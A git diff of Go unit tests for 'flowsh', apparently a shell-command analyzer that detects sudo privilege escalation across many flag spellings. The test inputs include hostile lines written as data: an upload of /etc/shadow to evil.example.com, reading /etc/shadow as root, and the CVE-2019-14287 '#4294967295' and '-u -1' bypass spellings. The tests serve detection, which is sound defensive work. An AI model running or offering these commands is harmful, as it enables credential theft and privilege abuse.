@@ -10,6 +10,7 @@ import (
 	"github.com/v0lka/flowsh/bind"
 	"github.com/v0lka/flowsh/engine"
 	"github.com/v0lka/flowsh/front/bash"
+	"github.com/v0lka/flowsh/kb"
 )
 
 func newBinder(t *testing.T) *bind.Binder {
@@ -715,9 +716,32 @@ func TestBindSudoElevationMatrix(t *testing.T) {
 		}
 	})
 
+	t.Run("-u ROOT literal elevates to root", func(t *testing.T) {
+		// user-name lookup folds case on some systems; claiming root is the
+		// safe over-report where it does not.
+		res := bindOne(t, b, "sudo -u ROOT whoami")
+		hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+	})
+
 	t.Run("-u root literal elevates to root", func(t *testing.T) {
 		res := bindOne(t, b, "sudo -u root whoami")
 		hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+	})
+
+	t.Run("-k with a command still runs it", func(t *testing.T) {
+		// -k only resets cached credentials; the command executes as root.
+		res := bindOne(t, b, "sudo -k touch /opt/x")
+		hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+		hasEffectOn(t, res, engine.KindFSMeta, engine.ModeDirect, "/opt/x")
+		explained := false
+		for _, n := range res.Notes {
+			if strings.Contains(n, "-k") && strings.Contains(n, "still runs") {
+				explained = true
+			}
+		}
+		if !explained {
+			t.Errorf("expected the -k explanatory note, notes=%v", res.Notes)
+		}
 	})
 
 	t.Run("-u 0 literal elevates to root", func(t *testing.T) {
@@ -806,8 +830,711 @@ func TestBindSudoElevationMatrix(t *testing.T) {
 	})
 }
 
-// TestBindNamelessWrapperElevation pins the two paths that never reach the
-// ordinary binding flow yet still must elevate: a privilege wrapper that
+// TestBindSudoElevationDoctrine pins the refinements of the -u doctrine that
+// keep it sound against sudo's own target grammar: the #-UID spellings, the
+// repeated -u, the option-shaped value glued after an unsatisfied -u, the
+// attached dynamic value forms, the inert flag-only lines, the bare -g
+// semantics of man sudo, the unpeeled path-qualified wrapper, and the
+// recorded-unsatisfied option semantics of the peel.
+func TestBindSudoElevationDoctrine(t *testing.T) {
+	b := newBinder(t)
+
+	t.Run("#0 UID spelling elevates to root", func(t *testing.T) {
+		res := bindOne(t, b, "sudo -u '#0' whoami")
+		hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+	})
+
+	t.Run("--user=#0 elevates to root", func(t *testing.T) {
+		res := bindOne(t, b, "sudo --user=#0 whoami")
+		hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+	})
+
+	t.Run("-u#0 cluster elevates to root", func(t *testing.T) {
+		res := bindOne(t, b, `sudo -u#0 whoami`)
+		hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+	})
+
+	t.Run("non-zero #-UID de-elevates with a note", func(t *testing.T) {
+		res := bindOne(t, b, "sudo -u '#1000' touch /opt/x")
+		if n := countKind(res, engine.KindPrivEsc); n != 0 {
+			t.Errorf("UID 1000 is not root: %d PrivEsc effects (%s)", n, effectsString(res))
+		}
+		explained := false
+		for _, n := range res.Notes {
+			if strings.Contains(n, "#1000") && strings.Contains(n, "not root") {
+				explained = true
+			}
+		}
+		if !explained {
+			t.Errorf("expected a note explaining the skipped elevation, notes=%v", res.Notes)
+		}
+	})
+
+	t.Run("leading zeros name root numerically", func(t *testing.T) {
+		// A bare `0` is a username by man sudo, but claiming root for the
+		// numeric spellings is the safe over-report (documented residual).
+		res := bindOne(t, b, "sudo -u 00 whoami")
+		hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+	})
+
+	t.Run("malformed #-spec elevates over ⊤ without claiming a direction", func(t *testing.T) {
+		res := bindOne(t, b, "sudo -u '#abc' cmd")
+		e, ok := findEffect(res, engine.KindPrivEsc, engine.ModeDirect)
+		if !ok || !e.Target.IsTop() {
+			t.Fatalf("expected PrivEsc/Direct over ⊤, got %s", effectsString(res))
+		}
+		claimed := false
+		for _, n := range res.Notes {
+			if strings.Contains(n, "no privilege escalation") {
+				claimed = true
+			}
+		}
+		if claimed {
+			t.Errorf("a value sudo will reject must not claim a de-elevation, notes=%v", res.Notes)
+		}
+	})
+
+	t.Run("repeated -u keeps the elevation over a ⊤ target", func(t *testing.T) {
+		for _, src := range []string{
+			"sudo -u nobody -u root touch /opt/x",
+			"sudo -u root -u nobody touch /opt/x",
+		} {
+			res := bindOne(t, b, src)
+			e, ok := findEffect(res, engine.KindPrivEsc, engine.ModeDirect)
+			if !ok {
+				t.Fatalf("%s: repeated -u must still elevate: %s", src, effectsString(res))
+			}
+			if !e.Target.IsTop() {
+				t.Errorf("%s: repeated -u target: got %s, want ⊤", src, e.Target)
+			}
+			if !strings.Contains(strings.Join(res.Notes, " "), "multiple -u") {
+				t.Errorf("%s: expected an ambiguity note, notes=%v", src, res.Notes)
+			}
+		}
+	})
+
+	t.Run("option glued after a dynamic -u is never the user", func(t *testing.T) {
+		// `sudo -u $U -g root …` must not read the glued "-g" as the target
+		// user and claim a de-elevation: the target is statically unknown.
+		for _, src := range []string{
+			"sudo -u $U -g root touch /opt/x",
+			"sudo -u $U -n touch /opt/x",
+		} {
+			res := bindOne(t, b, src)
+			e, ok := findEffect(res, engine.KindPrivEsc, engine.ModeDirect)
+			if !ok {
+				t.Fatalf("%s: must still elevate: %s", src, effectsString(res))
+			}
+			if !e.Target.IsTop() {
+				t.Errorf("%s: target: got %s, want ⊤", src, e.Target)
+			}
+			for _, n := range res.Notes {
+				if strings.Contains(n, "no privilege escalation") {
+					t.Errorf("%s: must not claim a de-elevation, notes=%v", src, res.Notes)
+				}
+			}
+			hasEffectOn(t, res, engine.KindFSMeta, engine.ModeDirect, "/opt/x")
+		}
+		// A glued -g swallows the group option whole: the unmodelled group
+		// change is still named.
+		res := bindOne(t, b, "sudo -u $U -g root touch /opt/x")
+		if !strings.Contains(strings.Join(res.Notes, " "), "group escalation is not modelled") {
+			t.Errorf("glued -g must still be named, notes=%v", res.Notes)
+		}
+	})
+
+	t.Run("attached dynamic value keeps the -u doctrine", func(t *testing.T) {
+		// `sudo -u"$U" cmd` and `sudo -u$U cmd` carry the same -u semantics as
+		// the separated spelling: a certain elevation over a ⊤ target, never a
+		// confident root.
+		for _, src := range []string{
+			"sudo -u$U cmd",
+			"sudo -u\"$U\" cmd",
+			"sudo --user=$U cmd",
+		} {
+			res := bindOne(t, b, src)
+			e, ok := findEffect(res, engine.KindPrivEsc, engine.ModeDirect)
+			if !ok {
+				t.Fatalf("%s: the recorded -u must still elevate: %s", src, effectsString(res))
+			}
+			if !e.Target.IsTop() {
+				t.Errorf("%s: target: got %s, want ⊤", src, e.Target)
+			}
+		}
+	})
+
+	t.Run("attached dynamic value leaves the next option free-standing", func(t *testing.T) {
+		// The quoted attached value is absorbed as the option's value (a
+		// placeholder the binder can never glue onto a following word), so a
+		// trailing option decides the line exactly as in the separated
+		// spelling: -l stays a listing, and -k keeps its own note instead of
+		// being eaten as the -u value.
+		res := bindOne(t, b, `sudo -u"$U" -l cmd`)
+		if n := countKind(res, engine.KindPrivEsc); n != 0 {
+			t.Errorf("the listing must be free-standing: %d PrivEsc (%s)", n, effectsString(res))
+		}
+		if !strings.Contains(strings.Join(res.Notes, " "), "only lists permissions") {
+			t.Errorf("expected the listing note, notes=%v", res.Notes)
+		}
+		res = bindOne(t, b, `sudo -u"$U" -k cmd`)
+		notes := strings.Join(res.Notes, " ")
+		if strings.Contains(notes, "not a valid user specification") {
+			t.Errorf("-k must not be glued as the -u value, notes=%v", res.Notes)
+		}
+		if !strings.Contains(notes, "-k resets cached credentials; the command still runs") {
+			t.Errorf("expected -k's own note, notes=%v", res.Notes)
+		}
+	})
+
+	t.Run("inert flag-only lines neither elevate nor claim de-elevation", func(t *testing.T) {
+		for _, src := range []string{"sudo -l", "sudo -v", "sudo -k", "sudo --version", "sudo -l cmd"} {
+			res := bindOne(t, b, src)
+			if n := countKind(res, engine.KindPrivEsc); n != 0 {
+				t.Errorf("%s: nothing executes, PrivEsc must not fire: %s", src, effectsString(res))
+			}
+			for _, n := range res.Notes {
+				if strings.Contains(n, "no privilege escalation") {
+					t.Errorf("%s: must not claim a de-elevation, notes=%v", src, res.Notes)
+				}
+			}
+		}
+	})
+
+	t.Run("sudo -l with a command word binds nothing", func(t *testing.T) {
+		// `sudo -l touch /opt/x` lists permissions and runs nothing: binding
+		// the words that follow would fabricate effects for a process that
+		// never starts.
+		res := bindOne(t, b, "sudo -l touch /opt/x")
+		if n := countKind(res, engine.KindFSMeta); n != 0 {
+			t.Errorf("nothing executes: the inner command must not bind (%s)", effectsString(res))
+		}
+		if n := countKind(res, engine.KindPrivEsc); n != 0 {
+			t.Errorf("nothing executes: PrivEsc must not fire (%s)", effectsString(res))
+		}
+		if !res.Conservative {
+			t.Errorf("the inert line must degrade to ⊤: %s", effectsString(res))
+		}
+	})
+
+	t.Run("the --list spelling is inert like -l", func(t *testing.T) {
+		res := bindOne(t, b, "sudo --list touch /opt/x")
+		if n := countKind(res, engine.KindFSMeta); n != 0 {
+			t.Errorf("--list runs nothing: the inner command must not bind (%s)", effectsString(res))
+		}
+		if n := countKind(res, engine.KindPrivEsc); n != 0 {
+			t.Errorf("--list runs nothing: PrivEsc must not fire (%s)", effectsString(res))
+		}
+		if !res.Conservative {
+			t.Errorf("the inert line must degrade to ⊤: %s", effectsString(res))
+		}
+	})
+
+	t.Run("print-and-exit spellings are inert with a command word", func(t *testing.T) {
+		for _, src := range []string{"sudo --version touch /opt/x", "sudo --help touch /opt/x"} {
+			res := bindOne(t, b, src)
+			if n := countKind(res, engine.KindFSMeta); n != 0 {
+				t.Errorf("%s: nothing executes: the inner command must not bind (%s)", src, effectsString(res))
+			}
+			if n := countKind(res, engine.KindPrivEsc); n != 0 {
+				t.Errorf("%s: nothing executes: PrivEsc must not fire (%s)", src, effectsString(res))
+			}
+			if !res.Conservative {
+				t.Errorf("%s: the inert line must degrade to ⊤: %s", src, effectsString(res))
+			}
+		}
+	})
+
+	t.Run("usage-error spellings are inert with a command word", func(t *testing.T) {
+		// -h is a remote host (valid only when listing), -v only validates,
+		// -K cannot be combined with a command: real sudo runs nothing.
+		for _, src := range []string{"sudo -h touch /opt/x", "sudo -v touch /opt/x", "sudo -K touch /opt/x"} {
+			res := bindOne(t, b, src)
+			if n := countKind(res, engine.KindFSMeta); n != 0 {
+				t.Errorf("%s: nothing executes: the inner command must not bind (%s)", src, effectsString(res))
+			}
+			if n := countKind(res, engine.KindPrivEsc); n != 0 {
+				t.Errorf("%s: nothing executes: PrivEsc must not fire (%s)", src, effectsString(res))
+			}
+			if !res.Conservative {
+				t.Errorf("%s: the inert line must degrade to ⊤: %s", src, effectsString(res))
+			}
+		}
+		// -l absorbs -h: the listing note decides the line, whatever the
+		// flag order.
+		res := bindOne(t, b, "sudo -l -h host touch /opt/x")
+		if n := countKind(res, engine.KindFSMeta); n != 0 {
+			t.Errorf("-l + -h runs nothing: the inner command must not bind (%s)", effectsString(res))
+		}
+		if !strings.Contains(strings.Join(res.Notes, " "), "only lists permissions") {
+			t.Errorf("-l + -h must be decided by the listing note, notes=%v", res.Notes)
+		}
+		res = bindOne(t, b, "sudo -h host -l touch /opt/x")
+		if n := countKind(res, engine.KindFSMeta); n != 0 {
+			t.Errorf("-h + -l runs nothing: the inner command must not bind (%s)", effectsString(res))
+		}
+		if !strings.Contains(strings.Join(res.Notes, " "), "only lists permissions") {
+			t.Errorf("-h + -l must be decided by the listing note, notes=%v", res.Notes)
+		}
+	})
+
+	t.Run("-h names a remote host when it carries one", func(t *testing.T) {
+		// `sudo -h host` names a remote host (the sudoers policy runs no
+		// remote command), unlike a bare `-h`, which only prints help; the
+		// note scopes its claim to the sudoers policy, as SECURITY.md
+		// documents.
+		res := bindOne(t, b, "sudo -h example.com")
+		notes := strings.Join(res.Notes, " ")
+		if strings.Contains(notes, "prints help and exits") {
+			t.Errorf("-h with a host must not be read as bare help, notes=%v", res.Notes)
+		}
+		if !strings.Contains(notes, "names a remote host") || !strings.Contains(notes, "sudoers policy") {
+			t.Errorf("expected the sudoers-scoped remote-host note, notes=%v", res.Notes)
+		}
+		if n := countKind(res, engine.KindPrivEsc); n != 0 {
+			t.Errorf("nothing executes: PrivEsc must not fire (%s)", effectsString(res))
+		}
+		// The bare spelling keeps the help reading.
+		res = bindOne(t, b, "sudo -h")
+		if !strings.Contains(strings.Join(res.Notes, " "), "prints help and exits") {
+			t.Errorf("bare -h prints help, notes=%v", res.Notes)
+		}
+		// The attached long form names a host too, and still says why the
+		// line is inert.
+		res = bindOne(t, b, "sudo --host=example.com")
+		notes = strings.Join(res.Notes, " ")
+		if !strings.Contains(notes, "names a remote host") || !strings.Contains(notes, "sudoers policy") {
+			t.Errorf("--host must name a remote host, notes=%v", res.Notes)
+		}
+	})
+
+	t.Run("a word after -- is a command, not a flag", func(t *testing.T) {
+		// `sudo -- --version touch /opt/x` runs "--version" as the command:
+		// the elevation fires and the unknown inner command degrades to ⊤.
+		res := bindOne(t, b, "sudo -- --version touch /opt/x")
+		if n := countKind(res, engine.KindPrivEsc); n != 1 {
+			t.Fatalf("the command after -- executes: %d PrivEsc (%s)", n, effectsString(res))
+		}
+		hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+		if !res.Conservative {
+			t.Errorf("the unknown inner command must stay conservative: %s", effectsString(res))
+		}
+	})
+
+	t.Run("flag-only -k reports that nothing runs", func(t *testing.T) {
+		res := bindOne(t, b, "sudo -k")
+		if n := countKind(res, engine.KindPrivEsc); n != 0 {
+			t.Errorf("nothing executes: PrivEsc must not fire (%s)", effectsString(res))
+		}
+		if !strings.Contains(strings.Join(res.Notes, " "), "runs no command") {
+			t.Errorf("expected the flag-only -k note, notes=%v", res.Notes)
+		}
+	})
+
+	t.Run("a shell flag keeps -k's line alive", func(t *testing.T) {
+		// `sudo -i -k` — in any order, cluster spelling or under a wrapper —
+		// resets the cached credentials and then runs a root login shell:
+		// -k beside a shell-implying -i/-s must never claim "runs no command"
+		// next to the elevation the very same line carries.
+		for _, src := range []string{
+			"sudo -i -k", "sudo -s -k", "sudo -k -i", "sudo -is -k", "env sudo -i -k",
+		} {
+			res := bindOne(t, b, src)
+			hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+			notes := strings.Join(res.Notes, " ")
+			if strings.Contains(notes, "runs no command") {
+				t.Errorf("%s: the shell flag runs a root shell; -k must not claim it runs nothing, notes=%v", src, res.Notes)
+			}
+			if !strings.Contains(notes, "-k resets cached credentials; the command still runs") {
+				t.Errorf("%s: expected the still-runs -k note, notes=%v", src, res.Notes)
+			}
+		}
+	})
+
+	t.Run("inert decisions beat the other doctrine branches", func(t *testing.T) {
+		for _, tc := range []struct {
+			src  string
+			note string
+		}{
+			{"sudo -i -l cmd", "only lists permissions"}, // the modelled listing decides over the shell flag
+			{"sudo -l -V cmd", "only lists permissions"}, // the modelled listing decides over the print-and-exit flag
+			{"sudo -V -l cmd", "only lists permissions"}, // …whatever the order
+			{"sudo -u nobody -K cmd", "runs no command"}, // inert beats the de-elevation
+			{"sudo --host=h touch /opt/x", "only valid in conjunction with -l"},
+			{"sudo -U nobody touch /opt/x", "only valid in conjunction with -l"},
+			{"sudo --other-user=x touch /opt/x", "only valid in conjunction with -l"},
+		} {
+			res := bindOne(t, b, tc.src)
+			if n := countKind(res, engine.KindPrivEsc); n != 0 {
+				t.Errorf("%s: nothing executes: PrivEsc must not fire (%s)", tc.src, effectsString(res))
+			}
+			if !strings.Contains(strings.Join(res.Notes, " "), tc.note) {
+				t.Errorf("%s: expected the %q note, notes=%v", tc.src, tc.note, res.Notes)
+			}
+		}
+	})
+
+	t.Run("CVE-2019-14287 boundary spellings claim no direction", func(t *testing.T) {
+		// The reserved -1 UID (#4294967295), its bare spelling, and values
+		// beyond the 32-bit UID range are sudo-invalid: the escalation stays
+		// certain over a ⊤ target and no de-elevation is ever claimed.
+		for _, src := range []string{
+			"sudo -u '#4294967295' touch /opt/x",
+			"sudo -u -1 touch /opt/x",
+			"sudo -u '#4294967296' touch /opt/x",
+		} {
+			res := bindOne(t, b, src)
+			e, ok := findEffect(res, engine.KindPrivEsc, engine.ModeDirect)
+			if !ok || !e.Target.IsTop() {
+				t.Fatalf("%s: expected PrivEsc/Direct over ⊤, got %s", src, effectsString(res))
+			}
+			if strings.Contains(strings.Join(res.Notes, " "), "no privilege escalation") {
+				t.Errorf("%s: must not claim a de-elevation, notes=%v", src, res.Notes)
+			}
+		}
+	})
+
+	t.Run("cluster with a dynamic tail keeps its leading flags", func(t *testing.T) {
+		// `sudo -lu"$U" cmd` spells `-l -u<unknown>`: the listing decides the
+		// inert line, and the unsatisfied -u never fabricates a root claim.
+		res := bindOne(t, b, `sudo -lu"$U" cmd`)
+		if n := countKind(res, engine.KindPrivEsc); n != 0 {
+			t.Errorf("the listing decides: %d PrivEsc (%s)", n, effectsString(res))
+		}
+		if !res.Conservative {
+			t.Errorf("the inert line must degrade to ⊤: %s", effectsString(res))
+		}
+		// `sudo -ug"$U" touch /opt/x`: real bash attaches the whole tail to
+		// -u (a user name the analysis cannot resolve), so the report keeps
+		// the certain elevation over a ⊤ target, never claims a de-elevation,
+		// and names the absorbed -g as the glued value with the target left
+		// unresolved.
+		res = bindOne(t, b, `sudo -ug"$U" touch /opt/x`)
+		e, ok := findEffect(res, engine.KindPrivEsc, engine.ModeDirect)
+		if !ok || !e.Target.IsTop() {
+			t.Fatalf("expected PrivEsc/Direct over ⊤, got %s", effectsString(res))
+		}
+		if strings.Contains(strings.Join(res.Notes, " "), "no privilege escalation") {
+			t.Errorf("must not claim a de-elevation, notes=%v", res.Notes)
+		}
+	})
+
+	t.Run("an absorbed value is never a free-standing flag", func(t *testing.T) {
+		// `sudo -p x -l cmd`: -p consumed its value, so -l stays a
+		// free-standing listing — inert. `sudo -p -l cmd`: -p consumed -l
+		// itself, so the line really runs cmd as root.
+		res := bindOne(t, b, "sudo -p x -l cmd")
+		if n := countKind(res, engine.KindPrivEsc); n != 0 {
+			t.Errorf("the listing decides: %d PrivEsc (%s)", n, effectsString(res))
+		}
+		if !strings.Contains(strings.Join(res.Notes, " "), "only lists permissions") {
+			t.Errorf("expected the listing note, notes=%v", res.Notes)
+		}
+		res = bindOne(t, b, "sudo -p -l cmd")
+		hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+		// The same absorption for an unmodelled value option is a documented
+		// over-report (SECURITY.md Known Risks): real sudo usage-errors on
+		// -C's non-numeric value and runs nothing.
+		res = bindOne(t, b, "sudo -C -l cmd")
+		hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+		if !strings.Contains(strings.Join(res.Notes, " "), "-C consumed the following word") {
+			t.Errorf("expected the absorption note, notes=%v", res.Notes)
+		}
+		// -D/-R relocate the path context; the report names the gap instead
+		// of staying silent (documented residual, SECURITY.md).
+		res = bindOne(t, b, "sudo -D /tmp rm -rf data")
+		if !strings.Contains(strings.Join(res.Notes, " "), "changes the working directory") {
+			t.Errorf("expected the -D path-context note, notes=%v", res.Notes)
+		}
+		res = bindOne(t, b, "sudo -R /tmp rm -rf data")
+		if !strings.Contains(strings.Join(res.Notes, " "), "changes the root directory") {
+			t.Errorf("expected the -R path-context note, notes=%v", res.Notes)
+		}
+		// A fully literal glued misspelling stays an unknown flag and
+		// over-claims the root elevation (binding.md, the Wrapper type).
+		res = bindOne(t, b, "sudo --usernobody touch /opt/x")
+		hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+	})
+
+	t.Run("cluster spellings reach the inert doctrine", func(t *testing.T) {
+		for _, tc := range []struct {
+			src  string
+			note string
+		}{
+			{"sudo -kv cmd", "runs no command"},
+			{"sudo -hk cmd", "prints help"},
+			{"sudo -ll touch /opt/x", "only lists permissions"},
+			{"sudo -u nobody -l cmd", "only lists permissions"},
+		} {
+			res := bindOne(t, b, tc.src)
+			if n := countKind(res, engine.KindPrivEsc); n != 0 {
+				t.Errorf("%s: nothing executes: PrivEsc must not fire (%s)", tc.src, effectsString(res))
+			}
+			if !strings.Contains(strings.Join(res.Notes, " "), tc.note) {
+				t.Errorf("%s: expected the %q note, notes=%v", tc.src, tc.note, res.Notes)
+			}
+		}
+	})
+
+	t.Run("flag-only sudo stays elevation-free across the inert spellings", func(t *testing.T) {
+		for _, src := range []string{"sudo", "sudo -K", "sudo -V"} {
+			res := bindOne(t, b, src)
+			if n := countKind(res, engine.KindPrivEsc); n != 0 {
+				t.Errorf("%s: nothing executes: PrivEsc must not fire (%s)", src, effectsString(res))
+			}
+		}
+		// A trailing bare `-u` with no value: real sudo usage-errors on the
+		// missing argument — the report names it like the other
+		// sudo-rejected spellings instead of staying silent.
+		res := bindOne(t, b, "sudo -u")
+		if n := countKind(res, engine.KindPrivEsc); n != 0 {
+			t.Errorf("sudo -u: nothing executes: PrivEsc must not fire (%s)", effectsString(res))
+		}
+		if len(res.Effects) != 0 {
+			t.Errorf("sudo -u: the inert consumed line reports the empty result (%s)", effectsString(res))
+		}
+		if !strings.Contains(strings.Join(res.Notes, " "), "-u/--user requires a value; nothing runs on this line") {
+			t.Errorf("sudo -u: expected the missing-value note, notes=%v", res.Notes)
+		}
+		// A statically-empty literal target (`sudo -u ''`, `sudo --user=`)
+		// is named like the other sudo-rejected spellings instead of staying
+		// silent: the user-bearing spelling always gets its user note.
+		for _, src := range []string{"sudo -u ''", "sudo --user="} {
+			res := bindOne(t, b, src)
+			if n := countKind(res, engine.KindPrivEsc); n != 0 {
+				t.Errorf("%s: nothing executes: PrivEsc must not fire (%s)", src, effectsString(res))
+			}
+			if !strings.Contains(strings.Join(res.Notes, " "), "not a valid user specification; nothing runs on this line") {
+				t.Errorf("%s: expected the invalid-specification note, notes=%v", src, res.Notes)
+			}
+		}
+	})
+
+	t.Run("sudo-rejected empty targets claim no direction", func(t *testing.T) {
+		// `sudo -u '' cmd` / `sudo --user= cmd`: sudo rejects the empty
+		// target, so the escalation stays certain over a ⊤ target and a note
+		// names the invalid specification.
+		for _, src := range []string{"sudo -u '' touch /opt/x", "sudo --user= touch /opt/x"} {
+			res := bindOne(t, b, src)
+			e, ok := findEffect(res, engine.KindPrivEsc, engine.ModeDirect)
+			if !ok || !e.Target.IsTop() {
+				t.Fatalf("%s: expected PrivEsc/Direct over ⊤, got %s", src, effectsString(res))
+			}
+			if !strings.Contains(strings.Join(res.Notes, " "), "not a valid user specification") {
+				t.Errorf("%s: expected the invalid-specification note, notes=%v", src, res.Notes)
+			}
+		}
+	})
+
+	t.Run("an inert wrapper suppresses elevations across the chain", func(t *testing.T) {
+		// `sudo -l sudo touch /opt/x` and `sudo sudo -l touch /opt/x` only
+		// list permissions: no privileged command executes on the line, so no
+		// wrapper on it may claim an elevation.
+		for _, src := range []string{
+			"sudo -l sudo touch /opt/x",
+			"sudo sudo -l touch /opt/x",
+		} {
+			res := bindOne(t, b, src)
+			if n := countKind(res, engine.KindPrivEsc); n != 0 {
+				t.Errorf("%s: the line runs no privileged command: %d PrivEsc (%s)", src, n, effectsString(res))
+			}
+			if !res.Conservative {
+				t.Errorf("%s: the inert line must degrade to ⊤: %s", src, effectsString(res))
+			}
+		}
+	})
+
+	t.Run("a wrapper above the privileged wrapper cannot keep an inert line alive", func(t *testing.T) {
+		// `env sudo -k` and `nohup sudo -k` exec a sudo that resets its
+		// cached credentials and exits: nothing inside the privileged
+		// wrapper, so the line is inert and reports the empty result — not
+		// the PrivEsc + "the command still runs" verdict a chain-wide
+		// inner-present reading fabricated for it.
+		for _, src := range []string{
+			"env sudo -k",
+			"nohup sudo -k",
+			"env sudo",
+			"sudo sudo -k",
+		} {
+			res := bindOne(t, b, src)
+			if n := countKind(res, engine.KindPrivEsc); n != 0 {
+				t.Errorf("%s: the line runs no privileged command: %d PrivEsc (%s)", src, n, effectsString(res))
+			}
+			if len(res.Effects) != 0 {
+				t.Errorf("%s: the inert consumed line reports the empty result: %s", src, effectsString(res))
+			}
+			if res.Conservative {
+				t.Errorf("%s: the empty result carries no ⊤ (the frontend interpreter's degradation owns it): %s", src, effectsString(res))
+			}
+		}
+		if !strings.Contains(strings.Join(bindOne(t, b, "env sudo -k").Notes, " "), "-k invalidates cached credentials and runs no command") {
+			t.Errorf("env sudo -k: expected the runs-no-command note, notes=%v", bindOne(t, b, "env sudo -k").Notes)
+		}
+
+		// Contrast: a wrapper INSIDE the privileged wrapper is a process
+		// sudo execs (`sudo env FOO=1` runs env as root), and a command word
+		// after the inert flag still runs (`env sudo -k whoami`).
+		res := bindOne(t, b, "sudo env FOO=1")
+		if n := countKind(res, engine.KindPrivEsc); n != 1 {
+			t.Errorf("sudo env FOO=1: the inner wrapper is a process sudo execs: want 1 PrivEsc, got %d (%s)", n, effectsString(res))
+		}
+		res = bindOne(t, b, "env sudo -k whoami")
+		if n := countKind(res, engine.KindPrivEsc); n != 1 {
+			t.Errorf("env sudo -k whoami: the command word runs despite -k: want 1 PrivEsc, got %d (%s)", n, effectsString(res))
+		}
+		if !strings.Contains(strings.Join(res.Notes, " "), "-k resets cached credentials; the command still runs") {
+			t.Errorf("env sudo -k whoami: expected the still-runs note, notes=%v", res.Notes)
+		}
+	})
+
+	t.Run("sudoedit mode is not modelled (documented residual)", func(t *testing.T) {
+		// `-e`/`--edit` takes no value, so the normalizer peels the file
+		// operand as the wrapped command: real sudoedit opens the file in an
+		// editor, but the report names the operand's binary. The escalation
+		// is still carried, so this is an over-report (SECURITY.md Known
+		// Risks), never a silent miss.
+		res := bindOne(t, b, "sudo -e /etc/passwd")
+		hasEffectOn(t, res, engine.KindPrivEsc, engine.ModeDirect, "root")
+		if !strings.Contains(strings.Join(res.Notes, " "), "flags not modelled by the knowledge base: -e") {
+			t.Errorf("expected the unmodelled-flag note, notes=%v", res.Notes)
+		}
+	})
+
+	t.Run("bare -g runs as the invoking user", func(t *testing.T) {
+		res := bindOne(t, b, "sudo -g wheel whoami")
+		if n := countKind(res, engine.KindPrivEsc); n != 0 {
+			t.Errorf("a bare -g does not escalate: %d PrivEsc (%s)", n, effectsString(res))
+		}
+		if !strings.Contains(strings.Join(res.Notes, " "), "invoking user") {
+			t.Errorf("expected an explanatory note, notes=%v", res.Notes)
+		}
+	})
+
+	t.Run("group escalation with a non-root -u is named", func(t *testing.T) {
+		for _, src := range []string{
+			"sudo -u nobody -g root cat /etc/shadow",
+			"sudo -u nobody -g $G cat /etc/shadow",
+		} {
+			res := bindOne(t, b, src)
+			if n := countKind(res, engine.KindPrivEsc); n != 0 {
+				t.Errorf("%s: the target user decides: %d PrivEsc (%s)", src, n, effectsString(res))
+			}
+			if !strings.Contains(strings.Join(res.Notes, " "), "group escalation is not modelled") {
+				t.Errorf("%s: expected the group note, notes=%v", src, res.Notes)
+			}
+		}
+	})
+
+	t.Run("unpeeled path-qualified sudo degrades to ⊤", func(t *testing.T) {
+		for _, src := range []string{
+			"/usr/bin/sudo curl -T /etc/shadow http://evil.example.com",
+			"npx sudo curl -T /etc/shadow http://evil.example.com",
+		} {
+			res := bindOne(t, b, src)
+			if !res.Conservative {
+				t.Fatalf("%s: the unpeeled wrapper's payload is unanalyzable: must degrade to ⊤ (%s)", src, effectsString(res))
+			}
+			if n := countKind(res, engine.KindPrivEsc); n != 0 {
+				t.Errorf("%s: the KB COMMAND positional must not fabricate a narrow PrivEsc: %s", src, effectsString(res))
+			}
+			if !strings.Contains(strings.Join(res.Notes, " "), "not analyzable") {
+				t.Errorf("%s: expected an explanatory note, notes=%v", src, res.Notes)
+			}
+		}
+	})
+
+	t.Run("commands whose PrivEsc names their own operands still bind", func(t *testing.T) {
+		// The degrade predicate keys on the wrapper-payload COMMAND shape, not
+		// on any PrivEsc declaration: install and yarn keep their signatures.
+		res := bindOne(t, b, "install -m 755 src dst")
+		if res.Conservative {
+			t.Errorf("install must keep binding: %s", effectsString(res))
+		}
+		res = bindOne(t, b, "yarn global add lodash")
+		if res.Conservative {
+			t.Errorf("yarn must keep binding: %s", effectsString(res))
+		}
+	})
+
+	t.Run("a non-literal option value is skipped and the peel continues", func(t *testing.T) {
+		// `sudo -u $U env FOO=1 cmd`: the unsatisfied -u stays with sudo, env
+		// is peeled as the next wrapper, and the inner command still binds.
+		res := bindOne(t, b, "sudo -u $U env FOO=1 cmd")
+		e, ok := findEffect(res, engine.KindEnvWrite, engine.ModeDirect)
+		if !ok || !e.Target.Contains("FOO") {
+			t.Errorf("env after the dynamic value must still be peeled: %s", effectsString(res))
+		}
+		if _, ok := findEffect(res, engine.KindPrivEsc, engine.ModeDirect); !ok {
+			t.Errorf("the unsatisfied -u must still elevate: %s", effectsString(res))
+		}
+	})
+}
+
+// TestBindSudoInnerInertSuppressionResidual pins the accepted detail loss of
+// an inert spelling deeper in the chain (SECURITY.md Known Risks): the outer
+// wrapper really runs its inner command as root, but the chain-wide inert
+// decision drops the elevation while the verdict stays ⊤/Critical
+// (DENY-or-INSPECT), never benign.
+func TestBindSudoInnerInertSuppressionResidual(t *testing.T) {
+	b := newBinder(t)
+	for _, src := range []string{"sudo -i sudo -l cmd", "sudo sudo -l touch /x"} {
+		res := bindOne(t, b, src)
+		if n := countKind(res, engine.KindPrivEsc); n != 0 {
+			t.Errorf("%s: the chain-wide inert decision suppresses the elevation: %d PrivEsc (%s)", src, n, effectsString(res))
+		}
+		if !res.Conservative {
+			t.Errorf("%s: the line must stay ⊤/Critical (DENY-or-INSPECT): %s", src, effectsString(res))
+		}
+	}
+}
+
+// TestBindSudoNestedWrapperResidual pins the documented over-report of a
+// nested privilege wrapper under a de-elevating outer one: the inner sudo
+// still claims a certain root PrivEsc beside the outer wrapper's de-elevation
+// note (each note speaks for its own wrapper — SECURITY.md Known Risks).
